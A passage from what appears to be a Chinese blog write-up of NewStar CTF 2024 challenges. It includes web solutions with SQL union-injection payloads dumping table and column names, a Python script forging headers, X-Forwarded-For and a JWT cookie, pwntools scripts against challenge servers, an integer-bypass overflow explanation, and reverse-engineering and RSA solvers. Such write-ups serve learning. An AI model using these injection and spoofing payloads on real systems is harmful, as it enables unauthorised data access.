</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>($cmd) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>; $i <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>; $i<span style="color:#f92672">--</span>) {
</span></span><span style="display:flex;"><span>    $reversed_cmd <span style="color:#f92672">.=</span> $cmd[$i];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>$hashed_reversed_cmd<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>($reversed_cmd);
</span></span><span style="display:flex;"><span>$decode_key<span style="color:#f92672">=</span>$hashed_reversed_cmd;
</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span><span style="color:#a6e22e">base64_encode</span>($decode_key);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $cmd;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $key;
</span></span></code></pre></div><p>将得到的对应内容进行post发包即可</p>
<h3 id="pangbai-过家家1">PangBai 过家家（1）<a hidden class="anchor" aria-hidden="true" href="#pangbai-过家家1">#</a></h3>
<p>体感不算好，但是题目很好，不知道为什么这么卡的原因</p>
<p>第一层没怎么看明白，简单的抓包后修改一下header里的cookie看网络回显location进入第二层</p>
<p>第二层换cookie，get发包?ask=miao</p>
<p>第三层post发包say=hello</p>
<p>第四层改个referer，再把agent改一下把firefox改成Papa就行了</p>
<p>这层好像也要改为say=玛卡巴卡阿卡哇卡米卡玛卡呣</p>
<p>第五层好像是发patch，我是python进行发包的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 目标 URL</span>
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://101.200.139.65:25030/?ask=Papa&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 构造文件上传部分和字符串参数</span>
</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;file&#39;</span>: (<span style="color:#e6db74">&#39;patch.zip&#39;</span>, open(<span style="color:#e6db74">&#39;1.zip&#39;</span>, <span style="color:#e6db74">&#39;rb&#39;</span>))}
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;say&#39;</span>: <span style="color:#e6db74">&#39;玛卡巴卡阿卡哇卡米卡玛卡呣&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 添加必要的 headers</span>
</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Cookie&#39;</span>: <span style="color:#e6db74">&#39;token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6MH0.J62yrWvSS_4OY6g19WR70lIq5DBRs70ISiH1rf8OUB0&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://101.200.139.65:35208/?ask=Papa&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Papa/5.0 (Windows NT 10.0; Win64; x64)&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://101.200.139.65:35208&#39;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>:<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 发送 PATCH 请求</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>patch(url, files<span style="color:#f92672">=</span>files, data<span style="color:#f92672">=</span>data, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 打印服务器返回的响应</span>
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><p>第六层好像是jwt的更改，题目给了密钥直接在网站上改为level0再带入进行了</p>
<p><img alt="13" loading="lazy" src="../../images/Newstar/2024/13.png"></p>
<p>最后带入进行修改我把包又带到bp的自带浏览器里面得到最后的flag,按一下醒来等flag就行了</p>
<p><img alt="14" loading="lazy" src="../../images/Newstar/2024/14.png"></p>
<h3 id="谢谢皮蛋">谢谢皮蛋<a hidden class="anchor" aria-hidden="true" href="#谢谢皮蛋">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#66d9ef">database</span>()<span style="color:#f92672">#</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,group_concat(<span style="color:#66d9ef">table_name</span>) <span style="color:#66d9ef">from</span> information_schema.tables <span style="color:#66d9ef">where</span> table_schema<span style="color:#f92672">=</span><span style="color:#66d9ef">database</span>()<span style="color:#f92672">#</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,group_concat(<span style="color:#66d9ef">column_name</span>) <span style="color:#66d9ef">from</span> information_schema.columns <span style="color:#66d9ef">where</span> <span style="color:#66d9ef">table_name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;Fl4g&#39;</span><span style="color:#f92672">#</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,group_concat(id,des,value) <span style="color:#66d9ef">from</span> Fl4g<span style="color:#f92672">#</span>
</span></span></code></pre></div><h2 id="re">Re<a hidden class="anchor" aria-hidden="true" href="#re">#</a></h2>
<h3 id="begin">begin<a hidden class="anchor" aria-hidden="true" href="#begin">#</a></h3>
<p>跟着流程做，一共三个部分，f5然后a,shiftf12,x</p>
<p>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p>
<h3 id="base64">base64<a hidden class="anchor" aria-hidden="true" href="#base64">#</a></h3>
<p>简单的base64换表</p>
<p><img alt="7" loading="lazy" src="../../images/Newstar/2024/7.png"></p>
<h3 id="ezandroidstudy">ezAndroidStudy<a hidden class="anchor" aria-hidden="true" href="#ezandroidstudy">#</a></h3>
<p>使用工具是jeb</p>
<p>flag1和flag2直接全局搜索得到flag部分，flag2在注释里，忘截屏了</p>
<p><img alt="8" loading="lazy" src="../../images/Newstar/2024/8.png"></p>
<p>flag3在xml中</p>
<p><img alt="9" loading="lazy" src="../../images/Newstar/2024/9.png"></p>
<p>flag4也是搜索然后在注释里得到</p>
<p><img alt="10" loading="lazy" src="../../images/Newstar/2024/10.png"></p>
<p>flag5在so里面导出然后带入ida逆向一下</p>
<p><img alt="11" loading="lazy" src="../../images/Newstar/2024/11.png"></p>
<h3 id="simple_encryption">Simple_encryption<a hidden class="anchor" aria-hidden="true" href="#simple_encryption">#</a></h3>
<p>ida然后f5看main函数，一个简单的异或，定位一下密钥，简单的脚本带入</p>
<p><img alt="12" loading="lazy" src="../../images/Newstar/2024/12.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> idaapi <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>decoded <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">30</span>):
</span></span><span style="display:flex;"><span>    enc <span style="color:#f92672">=</span> get_byte(<span style="color:#ae81ff">0x403020</span> <span style="color:#f92672">+</span> i)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> (enc <span style="color:#f92672">+</span> <span style="color:#ae81ff">31</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> i <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">=</span> (enc <span style="color:#f92672">-</span> <span style="color:#ae81ff">41</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:  <span style="color:#75715e"># i % 3 == 2</span>
</span></span><span style="display:flex;"><span>        enc <span style="color:#f92672">^=</span> <span style="color:#ae81ff">0x55</span>
</span></span><span style="display:flex;"><span>    decoded <span style="color:#f92672">+=</span> chr(enc)
</span></span><span style="display:flex;"><span>print(decoded)
</span></span></code></pre></div><h3 id="ez_debug">ez_debug<a hidden class="anchor" aria-hidden="true" href="#ez_debug">#</a></h3>
<p>ida打开简单的看一下判断flag后会对密文进行解密</p>
<p><img alt="15" loading="lazy" src="../../images/Newstar/2024/21.png">可以用x64dbg打断点得到flag</p>
<p><img alt="15" loading="lazy" src="../../images/Newstar/2024/20.png"></p>
<h2 id="pwn">pwn<a hidden class="anchor" aria-hidden="true" href="#pwn">#</a></h2>
<h3 id="real-login">Real Login<a hidden class="anchor" aria-hidden="true" href="#real-login">#</a></h3>
<p>有附件进行下载，ida的f5得到密钥，直接cat flag就行</p>
<p><img alt="15" loading="lazy" src="../../images/Newstar/2024/15.png"></p>
<h3 id="game">Game<a hidden class="anchor" aria-hidden="true" href="#game">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;39.106.48.123&#39;</span>, <span style="color:#ae81ff">30474</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Let&#39;s play a game!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;10&#39;</span>) 
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;pls input you num: &#34;</span>)  
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive() 
</span></span></code></pre></div><p><img alt="16" loading="lazy" src="../../images/Newstar/2024/16.png"></p>
<p>大概的思路就是在5u内填入数字最后大于999即可，然后就可以进入执行命令了</p>
<h3 id="overwrite">overwrite<a hidden class="anchor" aria-hidden="true" href="#overwrite">#</a></h3>
<p><img alt="16" loading="lazy" src="../../images/Newstar/2024/17.png"></p>
<p>有长度限制通过输入-1进行绕过，在read函数中会转换为unsigned int类型允许读取大量数据</p>
<p><code>nbytes_4</code> 在栈中有固定大小（0x30），填充 0x30 字节后，可以覆盖返回地址。</p>
<p><code>atoi</code> 的输入字符串在可处理的范围内（即不超过 <code>2147483647</code>），否则可能导致未定义行为，返回0</p>
<p>所以输入(0x30+0x06)个数字即可</p>
<p><img alt="18" loading="lazy" src="../../images/Newstar/2024/18.png"></p>
<h3 id="gdb">gdb<a hidden class="anchor" aria-hidden="true" href="#gdb">#</a></h3>
<p>ida简单的看一下</p>
<p><img loading="lazy" src="../../images/Newstar/2024/19.png"></p>
<p>用pwndbg进行查看，enc在<code>rbp-0x439</code>，<code>4557455355431d45</code>同时注意有不可见字符\x1d</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#34;101.200.139.65&#34;</span>,<span style="color:#ae81ff">25014</span>)
</span></span><span style="display:flex;"><span>s<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;data:&#39;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5d\x1d\x43\x55\x53\x45\x57\x45</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img alt="18" loading="lazy" src="../../images/Newstar/2024/22.png"></p>
<p>week2</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> bs4 <span style="color:#f92672">import</span> BeautifulSoup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/start&#39;</span>
</span></span><span style="display:flex;"><span>res <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>soup <span style="color:#f92672">=</span> BeautifulSoup(res<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
</span></span><span style="display:flex;"><span>text <span style="color:#f92672">=</span> soup<span style="color:#f92672">.</span>find(<span style="color:#e6db74">&#39;p&#39;</span>, id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;text&#39;</span>)<span style="color:#f92672">.</span>get_text()
</span></span><span style="display:flex;"><span>user_input <span style="color:#f92672">=</span> text
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>post_url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://eci-2zea4sz6ovy11afw7m58.cloudeci1.ichunqiu.com/submit&#39;</span>  <span style="color:#75715e"># 替换为实际的 POST URL</span>
</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;user_input&#39;</span>: user_input}  <span style="color:#75715e"># 设置 POST 数据</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 发送 POST 请求</span>
</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(post_url, data<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>print(response<span style="color:#f92672">.</span>text)
</span></span></code></pre></div><h1 id="week2">week2<a hidden class="anchor" aria-hidden="true" href="#week2">#</a></h1>
<h2 id="crypto-1">Crypto<a hidden class="anchor" aria-hidden="true" href="#crypto-1">#</a></h2>
<h3 id="这是几次方-疑惑">这是几次方？ 疑惑！<a hidden class="anchor" aria-hidden="true" href="#这是几次方-疑惑">#</a></h3>
<p>加法的运算逻辑在^之前</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知参数</span>
</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762</span>
</span></span><span style="display:flex;"><span>hint <span style="color:#f92672">=</span> <span style="color:#ae81ff">12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531673390</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 1: 恢复 p</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> hint <span style="color:#f92672">^</span> (e <span style="color:#f92672">+</span> <span style="color:#ae81ff">10086</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 2: 计算 q</span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> n <span style="color:#f92672">//</span> p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 3: 计算 d (私钥)</span>
</span></span><span style="display:flex;"><span>phi <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 4: 解密密文</span>
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> pow(c, d, n)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><h3 id="just-one-and-more-than-two">Just one and more than two<a hidden class="anchor" aria-hidden="true" href="#just-one-and-more-than-two">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 已知参数</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133</span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393</span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> <span style="color:#ae81ff">12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371</span>
</span></span><span style="display:flex;"><span>c1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451</span>
</span></span><span style="display:flex;"><span>c2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445</span>
</span></span><span style="display:flex;"><span>e <span style="color:#f92672">=</span> <span style="color:#ae81ff">65537</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 1: 从 c1 解密</span>
</span></span><span style="display:flex;"><span>d1 <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>m1 <span style="color:#f92672">=</span> pow(c1, d1, p)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 2: 计算 N 和 phi(N)</span>
</span></span><span style="display:flex;"><span>N <span style="color:#f92672">=</span> p <span style="color:#f92672">*</span> q <span style="color:#f92672">*</span> r
</span></span><span style="display:flex;"><span>phi_N <span style="color:#f92672">=</span> (p <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (q <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">*</span> (r <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 步骤 3: 从 c2 解密</span>
</span></span><span style="display:flex;"><span>d2 <span style="color:#f92672">=</span> pow(e, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, phi_N)
</span></span><span style="display:flex;"><span>m2 <span style="color:#f92672">=</span> pow(c2, d2, N)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 拼接明文</span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m1) <span style="color:#f92672">+</span> long_to_bytes(m2)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(flag<span style="color:#f92672">.</span>decode())
</span></span></code></pre></div><h3 id="since-you-konw-something">Since you konw something<a hidden class="anchor" aria-hidden="true" href="#since-you-konw-something">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor_bytes</span>(a, b):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> bytes(x <span style="color:#f92672">^</span> y <span style="color:#66d9ef">for</span> x, y <span style="color:#f92672">in</span> zip(a, b <span style="color:#f92672">*</span> (len(a) <span style="color:#f92672">//</span> len(b) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>)))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">218950457292639210021937048771508243745941011391746420225459726647571</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert c back to bytes</span>
</span></span><span style="display:flex;"><span>c_bytes <span style="color:#f92672">=</span> long_to_bytes(c)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Function to try decryption with a given key</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">try_decrypt</span>(key):
</span></span><span style="display:flex;"><span>    decrypted <span style="color:#f92672">=</span> xor_bytes(c_bytes, key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> decrypted<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;flag{&#39;</span>) <span style="color:#f92672">and</span> decrypted<span style="color:#f92672">.</span>endswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> decrypted<span style="color:#f92672">.</span>decode()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Try all possible single-byte keys</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> bytes([i])
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> try_decrypt(key)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> result:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found flag with key </span><span style="color:#e6db74">{</span>key<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># If single-byte key doesn&#39;t work, try short strings</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> result:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">import</span> itertools
</span></span><span style="display:flex;"><span>    chars <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>printable<span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> length <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">5</span>):  <span style="color:#75715e"># Try keys up to 4 characters long</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> key <span style="color:#f92672">in</span> itertools<span style="color:#f92672">.</span>product(chars, repeat<span style="color:#f92672">=</span>length):
</span></span><span style="display:flex;"><span>            key <span style="color:#f92672">=</span> bytes(key)
</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> try_decrypt(key)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found flag with key </span><span style="color:#e6db74">{</span>key<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>result<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> result:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> result:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Could not find the key. The key might be longer or more complex.&#34;</span>)
</span></span></code></pre></div><h3 id="茶里茶气">茶里茶气<a hidden class="anchor" aria-hidden="true" href="#茶里茶气">#</a></h3>
<p>难得自己分析之后再叫ai写的</p>
<p>开头是一个类tea的算法，然后之后拼接转回hex再拼接一下就行了</p>
